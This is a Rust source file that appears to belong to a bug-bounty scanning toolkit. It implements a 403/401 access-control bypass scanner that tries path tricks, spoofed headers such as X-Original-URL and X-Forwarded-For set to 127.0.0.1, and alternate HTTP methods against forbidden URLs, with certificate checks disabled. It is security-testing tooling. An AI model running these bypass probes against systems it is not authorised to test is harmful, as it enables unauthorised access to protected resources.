use crate::database::repository::Repository;
use crate::errors::Result;
use crate::tools::adapter::{SecurityTool, ToolInput, ToolOutput};
use crate::tools::executor::SafeProcessExecutor;
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use tokio::process::Command;
use tracing::info;

/// A successful 403/401 bypass finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Bypass403Finding {
    /// The original forbidden URL
    pub url: String,
    /// The bypass technique that worked
    pub technique: String,
    /// The bypassed URL (with headers/path manipulation)
    pub bypassed_url: String,
    /// HTTP status code achieved
    pub status_code: u16,
    /// Severity
    pub severity: String,
    /// Description
    pub description: String,
}

/// Native Rust 403/401 Bypass Scanner.
///
/// When a target returns 403 (Forbidden) or 401 (Unauthorized), it
/// doesn't mean access is impossible. Common bypass techniques:
///
/// **Path manipulation:**
/// - `/admin` → `/admin/`, `/admin/.`, `/%2fadmin`, `//admin`
/// - Case variation: `/Admin`, `/ADMIN`
///
/// **Header injection:**
/// - `X-Original-URL: /admin`
/// - `X-Rewrite-URL: /admin`
/// - `X-Forwarded-For: 127.0.0.1`
/// - `X-Custom-IP-Authorization: 127.0.0.1`
/// - `X-Real-IP: 127.0.0.1`
/// - `X-Host: localhost`
/// - `Referer: https://target.com/admin`
///
/// **HTTP Method tricks:**
/// - GET → POST, PUT, HEAD, OPTIONS, TRACE
///
/// Bypassing admin panels = instant P1/P2 reports.
pub struct Bypass403Scanner;

impl Bypass403Scanner {
    pub async fn scan_forbidden_urls(
        urls: &[String],
        concurrency: usize,
    ) -> Vec<Bypass403Finding> {
        use tokio::sync::Semaphore;
        use std::sync::Arc;

        let semaphore = Arc::new(Semaphore::new(concurrency));
        let mut handles = Vec::new();

        for url in urls {
            let url = url.clone();
            let sem = semaphore.clone();

            let handle = tokio::spawn(async move {
                let _permit = sem.acquire().await.ok()?;
                Self::try_bypass(&url).await
            });
            handles.push(handle);
        }

        let mut findings = Vec::new();
        for handle in handles {
            if let Ok(Some(result)) = handle.await {
                findings.extend(result);
            }
        }

        info!("403 Bypass scanner found {} bypass(es) across {} URLs.",
            findings.len(), urls.len());
        findings
    }

    async fn try_bypass(url: &str) -> Option<Vec<Bypass403Finding>> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .redirect(reqwest::redirect::Policy::none())
            .danger_accept_invalid_certs(true)
            .user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
            .build()
            .ok()?;

        // First, confirm the URL is actually 403/401
        let base_resp = client.get(url).send().await.ok()?;
        let base_status = base_resp.status().as_u16();
        if !matches!(base_status, 401 | 403) {
            return None;
        }

        let mut findings = Vec::new();

        // === TECHNIQUE 1: Path manipulation ===
        let path_variants = Self::generate_path_variants(url);
        for (technique, variant_url) in &path_variants {
            if let Ok(resp) = client.get(variant_url).send().await {
                let status = resp.status().as_u16();
                if matches!(status, 200 | 201 | 204 | 301 | 302) {
                    info!("🔓 403 BYPASS [{}] at '{}' via path technique: '{}' → {}",
                        status, url, technique, variant_url);
                    findings.push(Self::make_finding(url, technique, variant_url, status));
                }
            }
        }

        // === TECHNIQUE 2: Header injection ===
        let header_techniques = vec![
            ("X-Original-URL", "/"),
            ("X-Rewrite-URL", "/"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Host", "localhost"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
            ("Forwarded", "for=127.0.0.1"),
        ];

        for (header, value) in &header_techniques {
            if let Ok(resp) = client.get(url)
                .header(*header, *value)
                .send()
                .await
            {
                let status = resp.status().as_u16();
                if matches!(status, 200 | 201 | 204) && status != base_status {
                    let technique = format!("Header: {}: {}", header, value);
                    info!("🔓 403 BYPASS [{}] via header injection '{}' at '{}'",
                        status, technique, url);
                    findings.push(Self::make_finding(url, &technique, url, status));
                }
            }
        }

        // === TECHNIQUE 3: HTTP Method override ===
        for method in &["POST", "PUT", "PATCH", "HEAD", "OPTIONS"] {
            if let Ok(resp) = client.request(
                reqwest::Method::from_bytes(method.as_bytes()).unwrap(),
                url
            ).header("Content-Length", "0").send().await {
                let status = resp.status().as_u16();
                if matches!(status, 200 | 201 | 204) {
                    let technique = format!("Method: {}", method);
                    info!("🔓 403 BYPASS [{}] via HTTP method '{}' at '{}'",
                        status, method, url);
                    findings.push(Self::make_finding(url, &technique, url, status));
                }
            }
        }

        if findings.is_empty() { None } else { Some(findings) }
    }

    fn generate_path_variants(url: &str) -> Vec<(String, String)> {
        let base = url.trim_end_matches('/');
        let path = url.split('/').skip(3).collect::<Vec<_>>().join("/");
        let origin = url.splitn(4, '/').take(3).collect::<Vec<_>>().join("/");

        vec![
            ("Trailing slash".to_string(), format!("{}/", base)),
            ("Double slash".to_string(), format!("{}//{}", origin, path)),
            ("URL encode".to_string(), format!("{}/{}", origin, path.replace('/', "%2f"))),
            ("Dot bypass".to_string(), format!("{}/{}/.", origin, path)),
            ("Semicolon".to_string(), format!("{}/;/{}", origin, path)),
            ("Case upper".to_string(), format!("{}/{}", origin, path.to_uppercase())),
            ("..;/ trick".to_string(), format!("{}/..;/{}", origin, path)),
        ]
    }

    fn make_finding(original: &str, technique: &str, bypassed: &str, status: u16) -> Bypass403Finding {
        let severity = if status == 200 { "HIGH" } else { "MEDIUM" };
        Bypass403Finding {
            url: original.to_string(),
            technique: technique.to_string(),
            bypassed_url: bypassed.to_string(),
            status_code: status,
            severity: severity.to_string(),
            description: format!(
                "403/401 bypass confirmed at '{}' using technique '{}'. \
                Bypassed URL '{}' returned HTTP {}. \
                This may allow unauthorized access to protected resources.",
                original, technique, bypassed, status
            ),
        }
    }
}
